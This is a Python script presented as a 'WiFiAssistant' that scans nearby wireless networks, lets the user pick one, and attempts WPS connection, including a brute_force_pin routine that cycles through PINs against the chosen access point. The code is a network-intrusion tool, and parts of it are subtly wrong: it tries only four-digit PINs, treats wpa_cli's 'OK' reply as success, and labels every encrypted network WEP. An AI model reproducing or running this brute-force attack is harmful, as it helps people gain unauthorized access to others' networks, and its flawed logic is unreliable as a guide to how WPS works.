import subprocess
import re
import time

class WiFiAssistant:
    def __init__(self, interface):
        self.interface = interface

    def scan_networks(self):
        networks = []
        cmd = f'iw dev {self.interface} scan'
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        lines = proc.stdout.splitlines()
        network_info = {}
        for line in lines:
            if line.startswith('BSS '):
                network_info = {'BSSID': line.split()[1]}
            elif line.startswith('\tSSID:'):
                network_info['ESSID'] = line.split(': ')[1]
            elif line.startswith('\tsignal:'):
                network_info['Signal'] = int(line.split(': ')[1].split()[0])
            elif line.startswith('\tcapability:'):
                capability = line.split(': ')[1]
                network_info['Security'] = 'Open' if 'Privacy' not in capability else 'WEP'
            elif line.startswith('\tWPS:'):
                network_info['WPS'] = True if '1' in line else False
                networks.append(network_info)
        return networks

    def prompt_network(self, networks):
        print('Available networks:')
        for i, network in enumerate(networks, start=1):
            print(f"{i}. {network['ESSID']} ({network['BSSID']}) - Signal: {network['Signal']} dBm")
        choice = input('Select a network by number: ')
        return networks[int(choice) - 1]

    def connect_wps(self, network, pin=None):
        if network['WPS']:
            cmd = f'wpa_cli -i {self.interface} wps_pbc {network["BSSID"]}'
            if pin:
                cmd = f'wpa_cli -i {self.interface} wps_pin {network["BSSID"]} {pin}'
            subprocess.run(cmd, shell=True)
            time.sleep(5)  # Wait for connection to establish
            return True
        else:
            print('Selected network does not support WPS')
            return False

    def brute_force_pin(self, network):
        for pin in range(10000):
            cmd = f'wpa_cli -i {self.interface} wps_pin {network["BSSID"]} {pin:04d}'
            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if 'OK' in proc.stdout:
                print(f'Success! PIN found: {pin:04d}')
                return True
        print('Brute force unsuccessful')
        return False

if __name__ == "__main__":
    interface = input('Enter the name of the wireless interface: ')
    assistant = WiFiAssistant(interface)
    while True:
        print('Scanning for available networks...')
        networks = assistant.scan_networks()
        if networks:
            target_network = assistant.prompt_network(networks)
            if assistant.connect_wps(target_network):
                print('Successfully connected to the network')
                break
            else:
                print('Failed to connect using WPS')
                pin = input('Enter PIN to try (leave blank for brute force): ')
                if pin:
                    if assistant.connect_wps(target_network, pin):
                        print('Successfully connected to the network')
                        break
                    else:
                        print('Failed to connect using the provided PIN')
                else:
                    assistant.brute_force_pin(target_network)
                    break
        else:
            print('No networks found. Retrying in 10 seconds...')
            time.sleep(10)
